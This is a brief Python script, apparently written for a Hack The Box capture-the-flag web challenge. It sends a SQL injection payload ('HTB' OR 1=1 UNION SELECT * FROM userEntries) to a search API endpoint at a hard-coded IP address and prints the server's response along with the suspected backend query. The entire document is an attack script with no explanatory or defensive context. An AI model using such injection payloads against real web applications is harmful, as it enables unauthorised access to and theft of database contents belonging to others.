import requests



hostUrl = "http://178.62.96.143:30852/"
q = "'HTB' OR 1=1 UNION SELECT * FROM userEntries WHERE 1=1"
qTry = "Drunk%20Alien"
r = requests.get(hostUrl + "api/entries/search?q="+q)
oQ = f"SELECT * FROM userEntries WHERE title LIKE {q} AND approved = 1"

print(r.text + "\n")
print(oQ+"\n")
print(r.request)